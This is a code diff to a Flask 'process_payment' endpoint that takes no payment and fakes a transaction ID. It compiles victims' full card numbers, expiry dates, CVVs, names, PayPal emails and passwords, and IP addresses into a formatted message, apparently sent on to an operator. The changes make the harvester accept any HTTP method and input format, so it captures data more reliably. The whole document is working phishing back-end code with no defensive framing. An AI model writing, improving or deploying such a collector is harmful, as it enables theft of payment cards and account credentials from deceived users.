@@ -36,6 +36,9 @@ def generate_fake_transaction_id():
 
 def detect_card_type(card_number):
     """Detect credit card type based on number"""
+    if not card_number:
+        return 'Unknown'
+    
     card_number = card_number.replace(" ", "")
     if card_number.startswith('4'):
         return 'Visa'
@@ -52,10 +55,18 @@ def detect_card_type(card_number):
     else:
         return 'Unknown'
 
-@app.route('/api/process_payment', methods=['POST'])
+@app.route('/api/process_payment', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
 def process_payment():
     try:
-        data = request.json
+        # Handle different request methods
+        if request.method == 'GET':
+            data = request.args.to_dict()
+        else:
+            if request.is_json:
+                data = request.get_json()
+            else:
+                data = request.form.to_dict()
+        
         amount = data.get('amount', 0)
         payment_method = data.get('payment_method', 'unknown')
         user_info = data.get('user_info', {})
@@ -74,30 +85,35 @@ def process_payment():
 💳 Method: <code>{payment_method.upper()}</code>
 🌐 IP: <code>{ip_address}</code>
 🕒 Time: <code>{timestamp}</code>
+📤 Method: <code>{request.method}</code>
 
 <b>User Info:</b>
 """
-        for key, value in user_info.items():
-            message += f"🔹 {key}: <code>{value}</code>\n"
+        if isinstance(user_info, dict):
+            for key, value in user_info.items():
+                message += f"🔹 {key}: <code>{value}</code>\n"
+        else:
+            message += f"🔹 User Info: <code>{user_info}</code>\n"
 
         message += "\n<b>Payment Details:</b>\n"
         
         if payment_method == 'card':
+            card_number = payment_details.get('card_number', '') if isinstance(payment_details, dict) else ''
             message += f"""
-🔸 Card Number: <code>{payment_details.get('card_number', 'N/A')}</code>
-🔸 Card Type: <code>{payment_details.get('card_type', 'Unknown')}</code>
-🔸 Expiry: <code>{payment_details.get('expiry', 'N/A')}</code>
-🔸 CVV: <code>{payment_details.get('cvv', 'N/A')}</code>
-🔸 Name: <code>{payment_details.get('name', 'N/A')}</code>
+🔸 Card Number: <code>{card_number}</code>
+🔸 Card Type: <code>{detect_card_type(card_number)}</code>
+🔸 Expiry: <code>{payment_details.get('expiry', 'N/A') if isinstance(payment_details, dict) else 'N/A'}</code>
+🔸 CVV: <code>{payment_details.get('cvv', 'N/A') if isinstance(payment_details, dict) else 'N/A'}</code>
+🔸 Name: <code>{payment_details.get('name', 'N/A') if isinstance(payment_details, dict) else 'N/A'}</code>
 """
         elif payment_method == 'paypal':
             message += f"""
-🔸 PayPal Email: <code>{payment_details.get('email', 'N/A')}</code>
-🔸 Password: <code>{payment_details.get('password', 'N/A')}</code>
+🔸 PayPal Email: <code>{payment_details.get('email', 'N/A') if isinstance(payment_details, dict) else 'N/A'}</code>
+🔸 Password: <code>{payment_details.get('password', 'N/A') if isinstance(payment_details, dict) else 'N/A'}</code>
 """
         elif payment_method == 'crypto':
             message += f"""
-🔸 Crypto Type: <code>{payment_details.get('crypto_type', 'N/A')}</code>
+🔸 Crypto Type: <code>{payment_details.get('crypto_type', 'N/A') if isinstance(payment_details, dict) else 'N/A'}</code>
 """
             
         message += "\n<b>⚠️ THIS IS JUST A RECORD - NO REAL PAYMENT WAS PROCESSED ⚠️</b>"
